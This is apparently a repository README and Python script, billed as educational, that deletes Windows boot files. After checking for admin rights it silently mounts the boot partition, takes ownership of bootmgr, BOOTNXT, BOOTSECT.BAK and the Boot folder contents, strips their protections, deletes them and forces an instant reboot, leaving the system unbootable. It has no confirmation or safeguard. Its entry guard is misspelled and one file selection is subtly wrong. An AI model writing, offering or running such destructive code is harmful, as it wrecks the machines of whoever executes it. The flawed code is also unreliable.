# Boot-File-Deletion
Educational Python project demonstrating boot file deletion risks and operating system security.
import os
import ctypes
from pathlib import Path

def is_admin():
    """Check if the script is running with administrator privileges on Windows."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False

def win10_boot_removal_logic():
    print("[Check] Verifying administrator privileges...")
    
    if not is_admin():
        print("[Error] Script is NOT running with administrator privileges.")
        print("[Action] Please right-click your command prompt/editor and select 'Run as administrator'.")
        return
    
    print("[Success] Administrator privileges confirmed.")

    
    print("[Action] Assigning drive letter S: to boot partition...")
    diskpart_script = "select disk 0\nselect volume 1\nassign letter=S"
    with open("cmd_script.txt", "w") as f:
        f.write(diskpart_script)
    os.system("diskpart /s cmd_script.txt >nul 2>&1")
    if os.path.exists("cmd_script.txt"):
        os.remove("cmd_script.txt")

    
    target_paths = [
        Path(r"S:\Boot"),
        Path("S:\\")
    ]
    
    for boot_path in target_paths:
        print(f"\n[Targeting] Processing: {boot_path}")
        
        if not boot_path.exists():
            print(f"[Info] Path not found: {boot_path}")
            continue

        
        if boot_path == Path("S:\\"):
            boot_files = [boot_path / "bootmgr", boot_path / "BOOTNXT", boot_path / "BOOTSECT.BAK"]
            items_to_process = [f for f in boot_files if f.exists()]
        else:
            items_to_process = list(boot_path.glob("*/"))

        for file_path in items_to_process:
            if file_path.is_file():
                file_str = str(file_path)
                print(f"[Action] Processing: {file_str}")
                
                
                os.system(f'takeown /f "{file_str}" >nul 2>&1')
                os.system(f'icacls "{file_str}" /grant administrators:F >nul 2>&1')
                os.system(f'attrib -r -h -s "{file_str}" >nul 2>&1')
                
                try:
                    os.remove(file_str)
                    print(f"[Deleted] Successfully removed: {file_path.name}")
                except Exception as e:
                    print(f"[Error] Could not remove {file_path.name}: {e}")

   
    print("\n[Complete] Boot file processing finished.")
    print("[Action] Triggering system restart...")
    os.system('shutdown /r /t 0')

if _name_ == "_main_":
    win10_boot_removal_logic()
